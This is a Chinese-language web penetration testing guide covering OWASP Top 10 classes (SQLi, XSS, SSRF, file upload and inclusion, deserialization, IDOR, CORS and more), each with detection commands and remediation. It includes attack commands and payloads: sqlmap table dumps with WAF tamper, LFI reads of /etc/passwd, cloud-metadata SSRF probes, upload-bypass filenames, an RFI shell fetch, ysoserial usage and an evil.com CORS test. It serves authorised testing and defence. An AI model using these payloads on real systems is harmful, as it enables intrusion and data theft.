# Web 渗透测试(Web Penetration Testing)

> 关键词:Web渗透, OWASP Top 10, SQL注入, sqlmap, XSS, CSRF, SSRF, 文件上传, 文件包含, 反序列化, IDOR, 越权, 逻辑漏洞, 子域名接管, CORS, 点击劫持

## 概述

Web 渗透测试针对 Web 应用(前端、后端、API、中间件、数据库)进行漏洞发现与利用验证。本章按 **OWASP Top 10(2021)** 组织,每类漏洞给出:原理、检测方法、验证命令示例、修复建议。命令示例面向**授权测试**环境,payload 以验证性为主,不提供可造成真实危害的完整利用链。

> ⚠️ **仅限授权测试**:所有测试在授权范围内进行;验证漏洞时优先使用无害 payload(如 `'` 触发报错、延时函数),避免写入/删除数据。

## 注入类漏洞(Injection)

### 1. SQL 注入(SQLi)

**原理**:应用将用户输入拼接入 SQL 语句,导致攻击者控制查询逻辑,可越权读取/修改/删除数据,甚至写文件、执行命令(取决于数据库权限与配置)。

**检测方法**:

```bash
# 手工验证:在参数后加单引号,观察是否报错或行为异常
# URL: http://target.com/product?id=1'
curl -s "http://target.com/product?id=1'" | grep -iE "error|syntax|mysql|sqlite"
# 布尔盲注:对比正常与异常响应的差异
curl -s "http://target.com/product?id=1 AND 1=1" | wc -c
curl -s "http://target.com/product?id=1 AND 1=2" | wc -c   # 长度不同=存在注入点
# 时间盲注:响应延迟判断
curl -s "http://target.com/product?id=1 AND SLEEP(5)" --max-time 8 -w "%{time_total}s"
# 报错注入(MySQL)
# id=1' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

**sqlmap 自动化**:

```bash
sqlmap -u "http://target.com/product?id=1" --batch --dbs          # 列出数据库
sqlmap -u "http://target.com/product?id=1" -D dbname --tables     # 列表
sqlmap -u "http://target.com/product?id=1" -D dbname -T users --dump  # 导出数据
# POST 表单注入
sqlmap -u "http://target.com/login" --data "user=admin&pass=x" -p user --level 3
# 配合 Burp 抓包文件
sqlmap -r req.txt --batch --risk 3 --level 5
# 延时注入检测(--technique=T)与 WAF 绕过(--tamper=space2comment)
sqlmap -u "http://target.com/product?id=1" --technique=BT --tamper=space2comment --batch
```

**修复建议**:
- 使用**参数化查询/预编译语句**(首选),禁止拼接 SQL。
- 最小化数据库账号权限;关闭 `--secure-file-priv` 写文件、`xp_cmdshell` 等危险功能。
- 输入校验(白名单)、输出编码;部署 WAF 作为纵深防御(不能替代参数化)。

### 2. XSS(跨站脚本)

**原理**:未过滤的用户输入被浏览器解析为脚本。三类:反射型(URL 中注入,一次性)、存储型(写入数据库,持久危害)、DOM 型(纯前端处理,不经过服务端)。

**检测与验证**:

```bash
# 反射型验证:输入即回显的位置
# 搜索框 / 错误提示 / URL 参数回显
curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep -i "script"
# 常用 PoC(注意编码与上下文闭合)
# <script>alert(document.domain)</script>
# <img src=x onerror=alert(1)>
# "><svg onload=alert(1)>
# 闭合标签:"><script>alert(1)</script>
# DOM 型:检查前端 JS 是否用 innerHTML/location.hash 直接渲染用户输入
# 自动化检测工具:XSStrike
xsstrike -u "http://target.com/search?q=xss"
```

**利用与危害**:窃取 Cookie(`document.cookie` 发送到攻击者服务器)、钓鱼、键盘记录、CSRF 触发、篡改页面。验证时仅用 `alert`/`console.log` 等无害载荷。

**修复建议**:
- 输出编码:根据上下文使用 HTML 实体、JS 转义、URL 编码(CSP 首选)。
- 设置 `Content-Security-Policy`(如 `default-src 'self'`)。
- 配置 `HttpOnly` 与 `Secure` Cookie 属性,降低窃取危害。
- 输入校验白名单,富文本使用白名单过滤器(如 DOMPurify)。

### 3. CSRF(跨站请求伪造)

**原理**:用户已登录目标站点,攻击者诱导其浏览器向目标发起恶意请求(如改密码、转账),浏览器自动携带 Cookie,服务端无法区分请求来源。

**检测方法**:

```bash
# 1) 查看敏感操作的请求是否带 CSRF Token
# 2) 无 Token、无 SameSite 属性、无自定义头校验 = 存在 CSRF 风险
# 验证:Burp 中生成 PoC(Engagement tools → Generate CSRF PoC),在另一浏览器触发
# 请求特征检查(以改密码为例)
curl -v -X POST http://target.com/change_pwd -d "newpwd=test123" -b "session=xxx"
# 观察响应头:若携带 Set-Cookie 且无 SameSite=Lax/Strict,风险更高
```

**修复建议**:
- 敏感操作使用不可预测的 CSRF Token,服务端校验。
- 关键请求校验 `Origin`/`Referer` 头(宽松环境下不可靠)。
- 设置 `SameSite=Lax`/`Strict` Cookie 属性;二次确认(输入原密码/验证码)。
- 登录态短时效;关键操作(改密、转账)强制二次验证。

### 4. SSRF(服务端请求伪造)

**原理**:服务端功能(图片抓取、URL 预览、Webhook、导入)接收用户提供的 URL 并代为请求,攻击者可借机访问内网、云元数据、本机端口。

**检测方法**:

```bash
# 1) 找可输入 URL 的功能点:图片/PDF 生成、URL 解析、代理转发
# 2) 验证回显:提交可控 URL 指向自己的监听服务
# 本地监听(需公网可达或内网测试机)
nc -lvnp 8080
# 提交 url=http://你的IP:8080/ssrf_probe,若收到请求=存在 SSRF
# 3) 探测内网/元数据
# url=http://169.254.169.254/latest/meta-data/   (AWS 元数据)
# url=http://metadata.google.internal/            (GCP)
# url=http://127.0.0.1:6379                       (Redis 未授权)
# url=http://内网IP:端口                          (内网端口探测)
# 4) 绕过常见限制:127.0.0.1、localhost、[::1]、十进制/十六进制 IP、短域名、重定向
```

**修复建议**:
- URL 解析后校验**解析结果**(防 DNS rebinding:解析两次并对比)。
- 服务端网络层隔离:SSRF 功能走独立出口,防火墙禁止访问内网与元数据(169.254.0.0/16)。
- 协议白名单(仅 http/https)、端口白名单;禁止重定向跟随或限制跳转次数。
- 云环境使用 IMDSv2(要求 Token),封堵 169.254.169.254。

## 文件类漏洞

### 5. 文件上传(绕过与检测)

**原理**:上传功能未校验文件类型/内容,可上传 WebShell、恶意文件(HTML 钓鱼、SVG XSS),或利用解析漏洞执行代码。

**常见绕过方式与检测**:

```bash
# 1) 扩展名绕过(黑名单):php → php5 / phtml / phar / php.jpg(双扩展)
#    判断:上传后文件是否被当作脚本解析
# 2) Content-Type 伪造:改 Content-Type: image/png
# 3) 内容校验绕过:文件头加 GIF89a 魔数 + 一句话内容
# 4) 解析漏洞:
#    Nginx <8.03: /upload/1.jpg/x.php
#    Apache: .php.rar(多后缀解析)、.htaccess 上传
#    IIS 6.0: 1.asp;.jpg
# 5) 图片马+包含:上传含 PHP 代码的图片,配合文件包含漏洞执行
# 验证请求示例(Burp 拦截后修改)
# POST /upload HTTP/1.1
# Content-Disposition: form-data; name="file"; filename="shell.php5"
# Content-Type: image/png
```

**检测**:上传后访问文件,观察是否可执行(返回 PHP 输出而非源码)。用 `getimagesize`/内容魔数校验的站点更安全。

**修复建议**:
- **白名单扩展名 + MIME 校验 + 文件内容魔数校验**三重验证。
- 文件存储于独立域名/对象存储,与 Web 执行目录隔离;禁止直接执行上传目录脚本。
- 随机化文件名,禁止路径穿越(`../`);限制文件大小。
- 图片做二次渲染(去 EXIF/重新编码);对上传内容做病毒扫描。

### 6. 文件包含(LFI / RFI)

**原理**:参数直接拼接文件路径,可读取任意文件(LFI),或包含远程文件执行代码(RFI)。

**检测与验证**:

```bash
# LFI 读取敏感文件
# http://target.com/index.php?page=../../../../etc/passwd
curl -s "http://target.com/index.php?page=../../../../etc/passwd" | grep root
# Windows 目标
# page=..\..\..\..\windows\win.ini
# 编码绕过:../ → %2e%2e%2f 、....// 、..%252f(二次编码)
# 配合日志注入/伪协议(仅限授权环境):
# php 伪协议读源码:page=php://filter/convert.base64-encode/resource=index.php
# 日志包含:注入 UA 到 access.log,再 include 日志文件执行
# RFI 验证(需 allow_url_include=On):
# page=http://你的服务器/shell.txt
```

**修复建议**:
- 禁用动态包含;使用**白名单映射**(`page=home` → `include('pages/home.php')`)。
- 关闭 `allow_url_include`、`allow_url_fopen` 按需开启;限制 `open_basedir`。
- 对路径参数做规范化校验,拒绝 `..` 与绝对路径。

## 应用逻辑类漏洞

### 7. 反序列化(Deserialization)

**原理**:不可信数据被反序列化时触发类方法(gadget chain),可导致 RCE、文件操作。常见于 Java(ysoserial)、PHP(`unserialize`)、Python(pickle)、.NET。

**检测方法**:

```bash
# 1) 找反序列化入口:HTTP 请求中的 base64 对象、Cookie、参数
# 特征:JAVA 序列化以 aced0005 开头;PHP serialize 含 s:5:"value"
echo "rO0ABX..." | base64 -d | head -c 20   # 解码查看是否 Java 序列化
# 2) 版本与 gadget 匹配:识别框架(Shiro/Struts/Fastjson/Jackson/Log4j)
# 3) 验证(仅授权):使用 ysoserial 生成探测 payload 检测回连
# java -jar ysoserial.jar CommonsCollections1 "命令" > payload.bin
# 4) Fastjson 检测:提交 {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
# 5) 被动检测:Shiro 特征 → Set-Cookie: rememberMe=deleteMe(见信息收集指纹表)
```

**修复建议**:
- 禁止反序列化不可信数据;必须使用时:**签名/加密 + 白名单类过滤**。
- Java:升级组件版本、开启 RASP;PHP:改用 `json_decode`、对对象类型校验。
- 部署 WAF 拦截已知 gadget 特征;监控反序列化类加载与命令执行行为。

### 8. 越权(IDOR / 水平垂直越权)

**原理**:接口直接信任请求中的资源 ID,未校验归属。水平越权(访问他人同级别数据)、垂直越权(低权限访问高权限功能)。

**检测方法**:

```bash
# 1) 登录 A 账号抓取请求,记录资源 ID 与接口
# GET /api/user/1001/profile
# 2) 换 B 账号(B 无权限访问 1001)重放同一请求
curl -s -b "session=B的Cookie" "http://target.com/api/user/1001/profile"
# 3) 判断:若返回 1001 的数据=水平越权;若低权限账号能调用管理接口=垂直越权
# 4) 批量枚举:遍历 ID、订单号、文件编号(注意频率限制)
for i in $(seq 1000 1010); do curl -s -b "cookie" "http://target.com/api/order/$i" | head -c 100; echo; done
# 5) 对象级授权测试点:文件下载、发票、消息、聊天记录、附件
```

**修复建议**:
- 服务端做**对象级授权校验**:当前用户与资源属主比对。
- 使用不可猜测的资源标识(UUID/哈希);列表接口分页防遍历。
- 接口默认拒绝,按 RBAC/ABAC 显式授权;全链路鉴权(网关+服务)。

### 9. 逻辑漏洞(业务逻辑)

**原理**:业务规则未在服务端严格执行,可被绕过。典型:支付金额篡改、优惠券重放、验证码绕过、越权改单、限额绕过、积分刷取。

**检测思路**:

```bash
# 1) 梳理业务流程:注册→登录→下单→支付→发货,逐环节测试
# 2) 篡改请求体:把 price=100 改为 0.01 重放
# 3) 重放:同一优惠券/邀请码/领取接口重复调用
# 4) 顺序绕过:跳过步骤(直接请求支付成功回调)
# 5) 负数/极限值:数量传 -1、0、极大值
# 6) 并发:同一接口并发请求(burp intruder 或脚本)看是否绕过限制
# 验证:curl 重放请求,观察服务端是否重复扣减/重复发放
```

**修复建议**:
- 金额、数量等关键字段由**服务端计算**,不信任客户端传值。
- 幂等设计:优惠券/领取/回调接口加幂等键与状态机校验。
- 流程状态机校验(不允许跳步、回退);关键操作加验证码/二次确认。
- 并发场景使用数据库锁/分布式锁,防超发超扣。

## 配置类漏洞

### 10. 子域名接管(Subdomain Takeover)

**原理**:子域名 CNAME 指向第三方服务(如 `github.io`、`herokuapp`、`s3`、Azure),但对应资源已删除/未创建,攻击者可注册该资源接管域名,用于钓鱼或窃取 Cookie。

**检测方法**:

```bash
# 1) 收集子域名(见信息收集.md),解析看 CNAME
dig cname 子域名.example.com
# 2) 特征判断:子域名解析到第三方但访问 404 / NXDOMAIN 错误页
# 3) 自动化工具:subjack / subover / nuclei
nuclei -l subs.txt -t http/takeovers/ -silent
# 4) 手工验证:github.io 场景 —— 该用户名下无同名仓库
```

**修复建议**:
- 删除不再使用的 DNS 记录;对指向第三方服务的 CNAME 定期审计。
- 第三方服务侧创建占位资源或改用 A 记录自管;域名证书监控。

### 11. CORS 配置错误

**原理**:服务端错误地反射 `Origin` 或使用 `Access-Control-Allow-Origin: *` 且允许携带凭据,攻击者站点可跨域读取受害者数据。

**检测方法**:

```bash
# 1) 发送带自定义 Origin 的请求,观察响应
curl -s -H "Origin: https://evil.com" -H "Cookie: session=xxx" \
  http://target.com/api/userinfo -D - | grep -i "access-control"
# 危险组合:Access-Control-Allow-Origin: https://evil.com
#           + Access-Control-Allow-Credentials: true
# 2) 验证:攻击者页面 fetch('http://target.com/api/userinfo',{credentials:'include'})
#    能读取响应 = 可利用
```

**修复建议**:
- 配置**固定白名单 Origin**,禁止反射与 `*` + 凭据组合。
- 内部 API 不跨域时直接不返回 CORS 头;关键数据二次鉴权。

### 12. 点击劫持(Clickjacking)

**原理**:页面未设置 `X-Frame-Options`/CSP `frame-ancestors`,攻击者用透明 iframe 覆盖诱饵页面,诱导用户点击执行敏感操作(授权、转账、点赞)。

**检测方法**:

```bash
# 1) 检查响应头
curl -sI http://target.com | grep -iE "x-frame-options|content-security-policy"
# 2) 无 X-Frame-Options 且 CSP 无 frame-ancestors = 风险
# 3) 验证:本地写 html 内嵌 iframe 加载目标页,可正常显示即存在
```

**修复建议**:
- 全站设置 `X-Frame-Options: DENY`(或 `SAMEORIGIN`)。
- 更优:CSP 指令 `frame-ancestors 'self'`。
- 敏感操作页面额外加验证码/二次确认。

## 检测与防御总览

| 漏洞 | 主要检测手段 | 核心修复 |
| --- | --- | --- |
| SQLi | 手工 payload + sqlmap | 参数化查询、最小权限 |
| XSS | 反射测试 + XSStrike | 输出编码、CSP、HttpOnly |
| CSRF | Token 检查 + PoC | CSRF Token、SameSite |
| SSRF | 回连监听 + 元数据探测 | URL 校验、网络隔离、IMDSv2 |
| 上传 | 扩展/内容绕过测试 | 白名单+魔数校验、隔离存储 |
| 包含 | LFI 读文件、伪协议 | 白名单映射、禁远程包含 |
| 反序列化 | 特征识别 + 版本匹配 | 禁止反序列化不可信数据、RASP |
| IDOR | 双账号交叉重放 | 对象级授权校验 |
| 逻辑 | 流程梳理 + 篡改重放 | 服务端计算、幂等 |
| 接管 | CNAME 审计 + 工具 | 清理 DNS、占位资源 |
| CORS | Origin 反射测试 | 白名单 Origin |
| 点击劫持 | 响应头检查 | X-Frame-Options/CSP |

**通用建议**:全程使用 Burp Suite 抓包分析;对每次发现记录请求/响应证据;漏洞利用控制在「证明危害」程度;所有修复建议最终由开发侧落实后**复测验证**。
